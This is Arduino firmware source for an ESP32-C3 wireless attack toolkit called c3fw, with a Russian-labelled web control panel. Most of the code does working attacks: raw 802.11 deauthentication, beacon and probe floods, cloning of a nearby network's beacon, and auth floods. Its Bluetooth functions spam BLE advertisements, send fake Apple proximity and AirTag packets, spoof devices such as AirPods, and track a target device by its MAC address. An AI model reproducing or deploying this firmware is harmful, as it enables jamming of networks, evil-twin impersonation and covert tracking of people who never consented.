#include <WiFi.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEUtils.h>

#define AP_SSID "c3fw"
#define AP_PASS "deadbeef"
#define AP_CH   6
#define MAX_SCAN 40
#define BLE_SEC  5
#define BLE_MAX  60

WebServer http(80);
BLEScan* scan=nullptr;
BLEAdvertising* adv=nullptr;

uint32_t c_mgmt=0,c_data=0,c_ctrl=0,c_deauth=0,c_beacon=0,c_probe=0;
uint32_t c_ble=0,c_blespam=0,c_bleprox=0,c_airtag=0,c_inject=0;
bool sniff=false, blespam=false;
uint32_t t_log=0;
String blebuf=""; uint32_t blen=0;
String targetMac="";           
uint8_t savedMac[6];           


static const char PAGE[] PROGMEM = R"HTML(
<!doctype html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>c3fw panel</title>
<style>
:root{--bg:#0b0f14;--panel:#111820;--line:#1f2a36;--txt:#c7d3df;--dim:#6b7c8f;
--acc:#3fa9f5;--ok:#39d98a;--warn:#f5a623;--bad:#ef4d5a}
*{box-sizing:border-box}
html,body{margin:0;background:var(--bg);color:var(--txt);font:14px/1.4 -apple-system,Segoe UI,Roboto,Arial,sans-serif}
header{padding:14px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px}
header b{font-size:16px;color:#fff;letter-spacing:.5px}
header span{color:var(--dim);font-size:12px}
.wrap{padding:14px;max-width:960px;margin:0 auto}
h3{margin:18px 0 8px;font-size:12px;color:var(--dim);text-transform:uppercase;letter-spacing:1px;font-weight:600}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
button{background:var(--panel);color:var(--txt);border:1px solid var(--line);border-radius:8px;
padding:12px 10px;font:600 13px/1.2 inherit;cursor:pointer;text-align:left;transition:.12s}
button:hover{background:#16202a;border-color:#2a3a4a}
button:active{transform:translateY(1px)}
button.acc{border-color:#1d4d73;color:#bfe2ff;background:#0f1c26}
button.acc:hover{background:#122736}
button.warn{border-color:#5a4112;color:#ffd79a;background:#1a140a}
button.warn:hover{background:#241b0d}
button.bad{border-color:#5a1d24;color:#ffb4bb;background:#1a0d10}
button.bad:hover{background:#241216}
button b{display:block;font-size:11px;color:var(--dim);font-weight:500;margin-top:3px}
#log{background:#070b0f;border:1px solid var(--line);border-radius:8px;height:320px;overflow:auto;
padding:10px;margin-top:14px;white-space:pre-wrap;font:12px/1.45 ui-monospace,Consolas,monospace;color:#9fb3c8}
#log .cmd{color:var(--acc)}#log .err{color:var(--bad)}#log .ok{color:var(--ok)}
.bar{display:flex;gap:8px;align-items:center;margin-top:8px}
.bar input{flex:1;background:#070b0f;border:1px solid var(--line);color:var(--txt);
border-radius:8px;padding:10px;font:13px ui-monospace,monospace}
.bar button{flex:0 0 auto;text-align:center}
.row{display:flex;gap:8px;margin-top:8px}
.row input{flex:1;background:#070b0f;border:1px solid var(--line);color:var(--txt);
border-radius:8px;padding:9px;font:13px ui-monospace,monospace}
@media(max-width:480px){.grid{grid-template-columns:repeat(2,1fr)}}
</style></head><body>
<header><b>c3fw</b><span>local panel · 192.168.4.1</span></header>
<div class="wrap">

<h3>Wi-Fi · разведка</h3>
<div class="grid">
<button onclick="r('scan')">Скан сетей<b>список AP</b></button>
<button onclick="r('scan_deep')">Deep скан<b>включая hidden</b></button>
<button onclick="r('rssi')">RSSI топ<b>топ-10</b></button>
<button onclick="r('arp')">Клиенты AP<b>кто подключён</b></button>
<button onclick="r('chan')">Канал/инфо<b>AP + IP</b></button>
<button onclick="r('fstats')">Кадры<b>счётчики</b></button>
</div>

<h3>Wi-Fi · сниффер</h3>
<div class="grid">
<button class="acc" onclick="r('sniff')">Сниффер<b>promisc toggle</b></button>
<button onclick="r('framedump')">Frame dump<b>2 сек</b></button>
<button class="acc" onclick="r('promisc')">Promisc<b>toggle</b></button>
</div>

<h3>Wi-Fi · активное (лаба)</h3>
<div class="grid">
<button class="warn" onclick="r('deauth')">Deauth ×15<b>broadcast</b></button>
<button class="warn" onclick="r('beacon')">Beacon spam<b>5 SSID ×3</b></button>
<button class="warn" onclick="r('beaconflood')">Beacon flood<b>50 SSID</b></button>
<button class="warn" onclick="r('probe')">Probe spam<b>20 кадров</b></button>
<button class="warn" onclick="r('probeflood')">Probe flood<b>40 × каналы</b></button>
<button class="warn" onclick="r('beaconclone')">Beacon clone<b>клон сети</b></button>
<button class="warn" onclick="r('authflood')">Auth flood<b>20 кадров</b></button>
<button class="warn" onclick="r('inject')">Inject test<b>проверка SDK</b></button>
</div>

<h3>Wi-Fi · управление</h3>
<div class="grid">
<button onclick="r('mac')">MAC random<b>STA</b></button>
<button onclick="r('macrestore')">MAC restore<b>заводской</b></button>
<button onclick="r('txpow')">TX power<b>чтение</b></button>
<button onclick="r('stascan')">STA-скан<b>подключиться</b></button>
<button class="bad" onclick="r('wifioff')">Wi-Fi off<b>радио</b></button>
<button onclick="r('wifion')">Wi-Fi on<b>AP</b></button>
<button class="bad" onclick="r('wifireset')">Wi-Fi reset<b>полный</b></button>
</div>

<h3>BLE · разведка</h3>
<div class="grid">
<button onclick="r('blescan')">BLE пассив<b>5 сек</b></button>
<button onclick="r('blescan_deep')">BLE актив<b>5 сек</b></button>
<button onclick="r('blelist')">Список<b>последний</b></button>
<button onclick="location='/ble.csv'">Экспорт CSV<b>скачать</b></button>
<button onclick="r('blemac')">BLE MAC<b>адрес</b></button>
<button onclick="r('bletx')">BLE TX<b>power</b></button>
</div>

<h3>BLE · активное (лаба)</h3>
<div class="grid">
<button class="warn" onclick="r('blespam')">BLE spam<b>20 burst</b></button>
<button class="warn" onclick="r('bleprox')">Proximity<b>Apple/MS/Google</b></button>
<button class="warn" onclick="r('blebeacon')">iBeacon fake<b>1 кадр</b></button>
<button class="warn" onclick="r('bleairtag')">Airtag fake<b>Apple FindMy</b></button>
<button class="warn" onclick="r('blespoof')">Spoof<b>AirPods/etc</b></button>
<button class="warn" onclick="r('bletrack')">Трекер<b>MAC в поле ниже</b></button>
<button class="bad" onclick="r('bleoff')">BLE off<b>стоп</b></button>
<button class="bad" onclick="r('blereset')">BLE reset<b>полный</b></button>
</div>

<h3>Система</h3>
<div class="grid">
<button onclick="r('info')">Инфо чипа</button>
<button onclick="r('heap')">Heap</button>
<button onclick="r('stats')">Статистика</button>
<button onclick="r('clr')">Очистить</button>
<button class="bad" onclick="r('reboot')">Reboot</button>
</div>

<div id="log"></div>
<div class="row">
<input id="mac" placeholder="MAC для трекера: aa:bb:cc:dd:ee:ff" autocomplete="off">
<button onclick="r('bletrack_set?mac='+encodeURIComponent(document.getElementById('mac').value))">set</button>
</div>
<div class="bar">
<input id="q" placeholder="команда (help)" autocomplete="off">
<button onclick="runInput()">→</button>
</div>
</div>
<script>
const logEl=document.getElementById('log');
function line(t,cls){const d=document.createElement('div');if(cls)d.className=cls;d.textContent=t;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight}
async function r(c){line('> '+c,'cmd');
  try{const res=await fetch('/api/'+c);const t=await res.text();line(t,res.ok?'':'err')}
  catch(e){line('ERR '+e,'err')}}
function runInput(){const i=document.getElementById('q');const v=i.value.trim();i.value='';if(!v)return;
  fetch('/api/raw?q='+encodeURIComponent(v)).then(x=>x.text()).then(t=>{line('> '+v,'cmd');line(t)})}
document.getElementById('q').addEventListener('keydown',e=>{if(e.key==='Enter')runInput()});
line('c3fw v2 ready. 36 функций.');
</script></body></html>
)HTML";


void out(const String& s){ http.send(200,"text/plain",s); }
bool bleBusy(){ return blespam; }


void fScan(bool deep){
  int n=WiFi.scanNetworks(false,deep); if(n>MAX_SCAN)n=MAX_SCAN;
  String s="# "+String(n)+"\n";
  for(int i=0;i<n;i++){
    s+=String(i+1)+" ";
    s+=WiFi.SSID(i).length()?WiFi.SSID(i):String("<hidden>");
    s+=" "+String(WiFi.RSSI(i))+"dBm ch"+String(WiFi.channel(i))+" ";
    s+=(WiFi.encryptionType(i)==WIFI_AUTH_OPEN?"OPEN":"LOCK");
    s+=" "+WiFi.BSSIDstr(i)+"\n";
  }
  out(s);
}
void fRssi(){
  int n=WiFi.scanNetworks(); if(n>10)n=10;
  String s; for(int i=0;i<n;i++) s+=String(i+1)+" "+WiFi.SSID(i)+" "+String(WiFi.RSSI(i))+"dBm\n";
  out(s.length()?s:String("пусто"));
}
void fArp(){
  wifi_sta_list_t l; esp_wifi_ap_get_sta_list(&l);
  String s="clients "+String(l.num)+"\n";
  for(int i=0;i<l.num;i++){char m[18];sprintf(m,"%02x:%02x:%02x:%02x:%02x:%02x",
    l.sta[i].mac[0],l.sta[i].mac[1],l.sta[i].mac[2],l.sta[i].mac[3],l.sta[i].mac[4],l.sta[i].mac[5]);
    s+=String(m)+" "+String(l.sta[i].rssi)+"dBm\n";}
  out(s);
}
void fChan(){
  wifi_second_chan_t sec; uint8_t p; esp_wifi_get_channel(&p,&sec);
  String s="ap_ch "+String(AP_CH)+"\ncur "+String(p)+"\n";
  s+="stations "+String(WiFi.softAPgetStationNum())+"\nip "+WiFi.softAPIP().toString()+"\n";
  out(s);
}
void fDeauth(){
  uint8_t f[26]={0xC0,0x00,0x3A,0x01,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x00,0x07,0x00};
  esp_wifi_set_promiscuous(true); int ok=0;
  for(int i=0;i<15;i++){if(esp_wifi_80211_tx(WIFI_IF_STA,f,sizeof(f),false)==ESP_OK)ok++;c_deauth++;delay(15);}
  esp_wifi_set_promiscuous(false);
  out("deauth "+String(ok)+"/15 total "+String(c_deauth));
}
void fBeacon(){
  const char* nm[]={"freewifi","linksys","tp-link","dlink","guest"};
  uint8_t b[96]={0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
    0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};
  esp_wifi_set_promiscuous(true); int n=0;
  for(int r=0;r<3;r++){for(int k=0;k<5;k++){int len=strlen(nm[k]);b[37]=len;memcpy(&b[38],nm[k],len);
    if(esp_wifi_80211_tx(WIFI_IF_STA,b,38+len,false)==ESP_OK)n++;c_beacon++;}delay(40);}
  esp_wifi_set_promiscuous(false);
  out("beacon "+String(n)+" total "+String(c_beacon));
}
void fBeaconFlood(){
  esp_wifi_set_promiscuous(true); int n=0;
  const char* pref[]={"FreeWiFi_","HackMe_","VirusNet_","FBI_","TP-LINK_","MTS_","Beeline_","Guest_","AndroidAP_","iPhone_"};
  for(int i=0;i<50;i++){
    uint8_t b[128]={0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
      0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
      0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};
    char ssid[32]; snprintf(ssid,32,"%s%04X",pref[random(10)],esp_random()&0xFFFF);
    int len=strlen(ssid); b[37]=len; memcpy(&b[38],ssid,len);
    for(int k=10;k<16;k++)b[k]=esp_random()&0xFF;
    if(esp_wifi_80211_tx(WIFI_IF_STA,b,38+len,false)==ESP_OK)n++;
    c_beacon++; delay(10);
  }
  esp_wifi_set_promiscuous(false);
  out("beaconflood "+String(n)+"/50 total "+String(c_beacon));
}
void fProbe(){
  uint8_t f[30]={0x40,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0x00,0x04,'t','e','s','t'};
  esp_wifi_set_promiscuous(true); int ok=0;
  for(int i=0;i<20;i++){if(esp_wifi_80211_tx(WIFI_IF_STA,f,sizeof(f),false)==ESP_OK)ok++;c_probe++;delay(10);}
  esp_wifi_set_promiscuous(false);
  out("probe "+String(ok)+"/20");
}
void fProbeFlood(){
  esp_wifi_set_promiscuous(true); int sent=0,total=0;
  const char* ssids[]={"Home","FreeWiFi","MTS","Beeline","TP-LINK","AndroidAP"};
  for(int ch=1;ch<=13;ch+=2){
    esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
    for(int i=0;i<7;i++) for(int k=0;k<6;k++){
      const char* nm=ssids[k]; int len=strlen(nm);
      uint8_t p[64]={0x40,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0,0,(uint8_t)len};
      memcpy(&p[26],nm,len);
      if(esp_wifi_80211_tx(WIFI_IF_STA,p,26+len,false)==ESP_OK)sent++;
      c_probe++; total++; delay(8);
    }
  }
  esp_wifi_set_promiscuous(false); esp_wifi_set_channel(AP_CH,WIFI_SECOND_CHAN_NONE);
  out("probeflood "+String(sent)+" ("+String(total)+" attempts)");
}
void fBeaconClone(){
  int n=WiFi.scanNetworks(); if(n==0)return out("no nets");
  int best=0; for(int i=1;i<n;i++) if(WiFi.RSSI(i)>WiFi.RSSI(best))best=i;
  String ssid=WiFi.SSID(best); uint8_t ch=WiFi.channel(best);
  uint8_t bssid[6]; memcpy(bssid,WiFi.BSSID(best),6);
  esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  uint8_t b[128]={0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x64,0,0x31,0x04,0,0};
  memcpy(&b[10],bssid,6); memcpy(&b[16],bssid,6);
  int len=ssid.length(); if(len>32)len=32; b[37]=len; memcpy(&b[38],ssid.c_str(),len);
  int sent=0; for(int i=0;i<20;i++){if(esp_wifi_80211_tx(WIFI_IF_STA,b,38+len,false)==ESP_OK)sent++;delay(10);}
  esp_wifi_set_promiscuous(false); esp_wifi_set_channel(AP_CH,WIFI_SECOND_CHAN_NONE);
  out("clone "+ssid+" "+WiFi.BSSIDstr(best)+" sent "+String(sent)+"/20");
}
void fAuthFlood(){
  uint8_t f[30]={0xB0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
    0,0,0,0,0x01,0,0,0};
  esp_wifi_set_promiscuous(true); int ok=0;
  for(int i=0;i<20;i++){if(esp_wifi_80211_tx(WIFI_IF_STA,f,sizeof(f),false)==ESP_OK)ok++;delay(10);}
  esp_wifi_set_promiscuous(false);
  out("authflood "+String(ok)+"/20 (SDK может блокировать)");
}
void fInject(){
  uint8_t p[24]={0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0,0};
  esp_wifi_set_promiscuous(true); int ok=0;
  for(int i=0;i<5;i++){if(esp_wifi_80211_tx(WIFI_IF_STA,p,sizeof(p),false)==ESP_OK)ok++;delay(30);}
  esp_wifi_set_promiscuous(false);
  c_inject+=ok;
  out(ok?"inject ok "+String(ok)+"/5":"inject blocked by SDK (normal)");
}
void fSniff(){
  if(!sniff){sniff=true;c_mgmt=c_data=c_ctrl=0;t_log=millis();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb([](void*,wifi_promiscuous_pkt_type_t t){
      if(t==WIFI_PKT_MGMT)c_mgmt++; else if(t==WIFI_PKT_DATA)c_data++; else if(t==WIFI_PKT_CTRL)c_ctrl++;});
    out("sniff on");
  }else{sniff=false;esp_wifi_set_promiscuous(false);out("sniff off");}
}
void fFstats(){ out("mgmt "+String(c_mgmt)+" data "+String(c_data)+" ctrl "+String(c_ctrl)+" total "+String(c_mgmt+c_data+c_ctrl)); }
void fFrameDump(){
  uint32_t m=0,d=0,c=0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([&](void*,wifi_promiscuous_pkt_type_t t){
    if(t==WIFI_PKT_MGMT)m++; else if(t==WIFI_PKT_DATA)d++; else if(t==WIFI_PKT_CTRL)c++;});
  delay(2000); esp_wifi_set_promiscuous(false);
  out("2s: mgmt "+String(m)+" data "+String(d)+" ctrl "+String(c));
}
void fPromisc(){
  sniff=!sniff; esp_wifi_set_promiscuous(sniff);
  out(String("promisc ")+(sniff?"on":"off"));
}
void fMac(){
  uint8_t m[6];for(int i=0;i<6;i++)m[i]=random(0,256);
  m[0]&=0xFE;m[0]|=0x02;
  int r=esp_wifi_set_mac(WIFI_IF_STA,m);
  char b[64];sprintf(b,"mac %02x:%02x:%02x:%02x:%02x:%02x r=%d",m[0],m[1],m[2],m[3],m[4],m[5],r);
  out(b);
}
void fMacRestore(){
  int r=esp_wifi_set_mac(WIFI_IF_STA,savedMac);
  char b[64];sprintf(b,"restored %02x:%02x:%02x:%02x:%02x:%02x r=%d",
    savedMac[0],savedMac[1],savedMac[2],savedMac[3],savedMac[4],savedMac[5],r);
  out(b);
}
void fTxpow(){ int8_t p;esp_wifi_get_max_tx_power(&p);out("tx "+String(p)+"u "+String(p*0.25)+"dBm"); }
void fStaScan(){ out("STA-скан: задай STA_SSID/STA_PASS в коде или через raw sta ssid pass (не реализовано в этой сборке)"); }
void fWifiOff(){ sniff=false;esp_wifi_set_promiscuous(false);WiFi.mode(WIFI_OFF);out("wifi off"); }
void fWifiOn(){ WiFi.mode(WIFI_AP);WiFi.softAP(AP_SSID,AP_PASS,AP_CH);out("wifi on "+WiFi.softAPIP().toString()); }
void fWifiReset(){ sniff=false;esp_wifi_set_promiscuous(false);esp_wifi_restore();out("wifi reset"); }

// ================= ble =================
class CB: public BLEAdvertisedDeviceCallbacks{
  void onResult(BLEAdvertisedDevice d){
    if(blen>=BLE_MAX)return; blen++;
    String l=d.getAddress().toString().c_str();
    l+=" "+String(d.getRSSI())+"dBm";
    if(d.haveName())l+=" \""+String(d.getName().c_str())+"\"";
    if(d.haveServiceUUID())l+=" "+String(d.getServiceUUID().toString().c_str());
    l+="\n"; blebuf=l+blebuf;
  }
};
void fBleScan(bool deep){
  if(!scan)return out("ble off");
  if(bleBusy())return out("busy");
  blebuf="";blen=0;
  scan->setActiveScan(deep); scan->setInterval(100); scan->setWindow(99);
  scan->start(BLE_SEC,false); scan->clearResults();
  out("found "+String(blen)+"\n"+blebuf);
}
void fBleList(){ out("n "+String(blen)+"\n"+(blebuf.length()?blebuf:String("(empty)"))); }
void fBleMac(){ out("ble_mac "+String(BLEDevice::getAddress().toString().c_str())); }
void fBleTx(){ out("ble tx: P9..N27, default P9=+9dBm"); }
void fBleSpam(){
  if(bleBusy())return out("busy");
  if(!adv)adv=BLEDevice::getAdvertising();
  int sent=0;
  for(int i=0;i<20;i++){
    BLEAdvertisementData a;
    a.setName(("s"+String(random(1000,9999))).c_str());
    a.setManufacturerData(String(random(0,255)));
    adv->setAdvertisementData(a);
    adv->start();delay(250);adv->stop();
    sent++;c_blespam++;
  }
  out("ble spam "+String(sent)+" total "+String(c_blespam));
}
void fBleProx(){
  if(!adv)adv=BLEDevice::getAdvertising();
  const char* pkts[]={"\x4C\x00\x02\x15","\x4C\x00\x10\x05","\x06\x00\x03\x03","\x75\x00\x01\x02"};
  int sent=0;
  for(int i=0;i<30;i++){
    BLEAdvertisementData a;
    a.setManufacturerData(std::string(pkts[random(4)],4));
    a.setName(("p"+String(random(100,999))).c_str());
    adv->setAdvertisementData(a);
    adv->start();delay(80);adv->stop();
    sent++;c_bleprox++;
  }
  out("prox "+String(sent)+" total "+String(c_bleprox));
}
void fBleBeacon(){
  if(!adv)adv=BLEDevice::getAdvertising();
  BLEAdvertisementData a;
  a.setName(("b"+String(random(100))).c_str());
  a.setManufacturerData(String(random(0,255)));
  adv->setAdvertisementData(a);
  adv->start();delay(400);adv->stop();
  out("ibeacon fake sent");
}
void fBleAirtag(){
  if(!adv)adv=BLEDevice::getAdvertising();
  uint8_t pkt[29]={0x1E,0xFF,0x4C,0x00,0x12,0x19,0x00,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
  for(int i=6;i<18;i++)pkt[i]=esp_random()&0xFF;
  BLEAdvertisementData a;
  a.setManufacturerData(std::string((char*)pkt,29));
  adv->setAdvertisementData(a);
  adv->start();delay(500);adv->stop();
  c_airtag++;
  out("airtag fake sent total "+String(c_airtag));
}
void fBleSpoof(){
  if(!adv)adv=BLEDevice::getAdvertising();
  const char* names[]={"AirPods","Mi Band","JBL Go","Galaxy Buds","Fitbit"};
  BLEAdvertisementData a;
  a.setName(names[random(5)]);
  a.setManufacturerData(String(random(0,255)));
  adv->setAdvertisementData(a);
  adv->start();delay(500);adv->stop();
  out("spoof sent");
}
void fBleTrackSet(){
  targetMac=http.arg("mac"); targetMac.trim();
  if(!targetMac.length())return out("usage: mac aa:bb:..");
  out("target set: "+targetMac);
}
void fBleTrack(){
  if(!targetMac.length())return out("set mac first");
  if(!scan)return out("ble off");
  blen=0;blebuf="";
  scan->start(3,false); scan->clearResults();
  bool found=blebuf.indexOf(targetMac)>=0;
  out(found?("FOUND "+targetMac+"\n"+blebuf):"not found in last scan");
}
void fBleOff(){ blespam=false; if(adv)adv->stop(); if(scan)scan->stop(); out("ble stopped"); }
void fBleReset(){
  if(adv)adv->stop(); if(scan)scan->stop();
  BLEDevice::deinit(false); BLEDevice::init("c3fw");
  scan=BLEDevice::getScan(); scan->setAdvertisedDeviceCallbacks(new CB(),true);
  out("ble reset");
}

// ================= sys =================
void fInfo(){
  String s="chip esp32-c3\nmac_sta "+WiFi.macAddress()+"\nmac_ap "+WiFi.softAPmacAddress();
  s+="\nflash "+String(ESP.getFlashChipSize()/1024)+"k\ncpu "+String(ESP.getCpuFreqMHz())+"mhz";
  s+="\nheap "+String(ESP.getFreeHeap())+"\nuptime "+String(millis()/1000)+"s\n";
  out(s);
}
void fHeap(){ out("free "+String(ESP.getFreeHeap())+"\nmin "+String(ESP.getMinFreeHeap())+"\nmax "+String(ESP.getMaxAllocHeap())); }
void fStats(){
  String s="mgmt "+String(c_mgmt)+" data "+String(c_data)+" ctrl "+String(c_ctrl)+"\n";
  s+="deauth "+String(c_deauth)+" beacon "+String(c_beacon)+" probe "+String(c_probe)+"\n";
  s+="inject "+String(c_inject)+"\nble_found "+String(blen)+"\n";
  s+="ble_spam "+String(c_blespam)+" prox "+String(c_bleprox)+" airtag "+String(c_airtag)+"\n";
  s+="sniff "+(sniff?"on":"off")+"\nuptime "+String(millis()/1000)+"s heap "+String(ESP.getFreeHeap())+"\n";
  out(s);
}
void fClr(){ c_mgmt=c_data=c_ctrl=c_deauth=c_beacon=c_probe=0;c_blespam=c_bleprox=c_airtag=c_inject=0;blen=0;blebuf="";out("clr"); }
void fReboot(){ out("reboot"); delay(500); ESP.restart(); }


void fRaw(){
  String q=http.arg("q"); q.trim();
  if(!q.length())return out("");
  if(q=="help")return out(
    "wifi: scan scan_deep rssi arp chan fstats sniff framedump promisc deauth beacon beaconflood probe probeflood beaconclone authflood inject mac macrestore txpow stascan wifioff wifion wifireset\n"
    "ble: blescan blescan_deep blelist blemac bletx blespam bleprox blebeacon bleairtag blespoof bletrack bletrack_set?mac=.. bleoff blereset\n"
    "sys: info heap stats clr reboot\n");
  if(q=="scan")return fScan(false); if(q=="scan_deep")return fScan(true);
  if(q=="rssi")return fRssi(); if(q=="arp")return fArp(); if(q=="chan")return fChan();
  if(q=="fstats")return fFstats(); if(q=="sniff")return fSniff();
  if(q=="framedump")return fFrameDump(); if(q=="promisc")return fPromisc();
  if(q=="deauth")return fDeauth(); if(q=="beacon")return fBeacon();
  if(q=="beaconflood")return fBeaconFlood(); if(q=="probe")return fProbe();
  if(q=="probeflood")return fProbeFlood(); if(q=="beaconclone")return fBeaconClone();
  if(q=="authflood")return fAuthFlood(); if(q=="inject")return fInject();
  if(q=="mac")return fMac(); if(q=="macrestore")return fMacRestore();
  if(q=="txpow")return fTxpow(); if(q=="stascan")return fStaScan();
  if(q=="wifioff")return fWifiOff(); if(q=="wifion")return fWifiOn(); if(q=="wifireset")return fWifiReset();
  if(q=="blescan")return fBleScan(false); if(q=="blescan_deep")return fBleScan(true);
  if(q=="blelist")return fBleList(); if(q=="blemac")return fBleMac(); if(q=="bletx")return fBleTx();
  if(q=="blespam")return fBleSpam(); if(q=="bleprox")return fBleProx();
  if(q=="blebeacon")return fBleBeacon(); if(q=="bleairtag")return fBleAirtag();
  if(q=="blespoof")return fBleSpoof(); if(q=="bletrack")return fBleTrack();
  if(q=="bleoff")return fBleOff(); if(q=="blereset")return fBleReset();
  if(q=="info")return fInfo(); if(q=="heap")return fHeap(); if(q=="stats")return fStats();
  if(q=="clr")return fClr(); if(q=="reboot")return fReboot();
  out("unknown: "+q);
}


void setup(){
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID,AP_PASS,AP_CH);
  Serial.print("ip "); Serial.println(WiFi.softAPIP());

  
  esp_wifi_get_mac(WIFI_IF_STA,savedMac);

  BLEDevice::init("c3fw");
  scan=BLEDevice::getScan();
  scan->setAdvertisedDeviceCallbacks(new CB(),true);

  http.on("/", [](){ http.send_P(200,"text/html",PAGE); });

  http.on("/api/scan",        [](){ fScan(false); });
  http.on("/api/scan_deep",   [](){ fScan(true); });
  http.on("/api/rssi",        fRssi);
  http.on("/api/arp",         fArp);
  http.on("/api/chan",        fChan);
  http.on("/api/fstats",      fFstats);
  http.on("/api/sniff",       fSniff);
  http.on("/api/framedump",   fFrameDump);
  http.on("/api/promisc",     fPromisc);
  http.on("/api/deauth",      fDeauth);
  http.on("/api/beacon",      fBeacon);
  http.on("/api/beaconflood", fBeaconFlood);
  http.on("/api/probe",       fProbe);
  http.on("/api/probeflood",  fProbeFlood);
  http.on("/api/beaconclone", fBeaconClone);
  http.on("/api/authflood",   fAuthFlood);
  http.on("/api/inject",      fInject);
  http.on("/api/mac",         fMac);
  http.on("/api/macrestore",  fMacRestore);
  http.on("/api/txpow",       fTxpow);
  http.on("/api/stascan",     fStaScan);
  http.on("/api/wifioff",     fWifiOff);
  http.on("/api/wifion",      fWifiOn);
  http.on("/api/wifireset",   fWifiReset);
  http.on("/api/blescan",     [](){ fBleScan(false); });
  http.on("/api/blescan_deep",[](){ fBleScan(true); });
  http.on("/api/blelist",     fBleList);
  http.on("/api/blemac",      fBleMac);
  http.on("/api/bletx",       fBleTx);
  http.on("/api/blespam",     fBleSpam);
  http.on("/api/bleprox",     fBleProx);
  http.on("/api/blebeacon",   fBleBeacon);
  http.on("/api/bleairtag",   fBleAirtag);
  http.on("/api/blespoof",    fBleSpoof);
  http.on("/api/bletrack",    fBleTrack);
  http.on("/api/bletrack_set",fBleTrackSet);
  http.on("/api/bleoff",      fBleOff);
  http.on("/api/blereset",    fBleReset);
  http.on("/api/info",        fInfo);
  http.on("/api/heap",        fHeap);
  http.on("/api/stats",       fStats);
  http.on("/api/clr",         fClr);
  http.on("/api/reboot",      fReboot);
  http.on("/api/raw",         fRaw);
  http.on("/ble.csv", [](){
    http.sendHeader("Content-Disposition","attachment; filename=ble.csv");
    http.send(200,"text/csv","mac rssi name uuid\n"+blebuf);
  });

  http.begin();
  Serial.println("http up");
}

void loop(){
  http.handleClient();
  if(sniff && millis()-t_log>2000){
    t_log=millis();
    Serial.printf("[sniff] m=%lu d=%lu c=%lu\n",c_mgmt,c_data,c_ctrl);
  }
  delay(2);
}
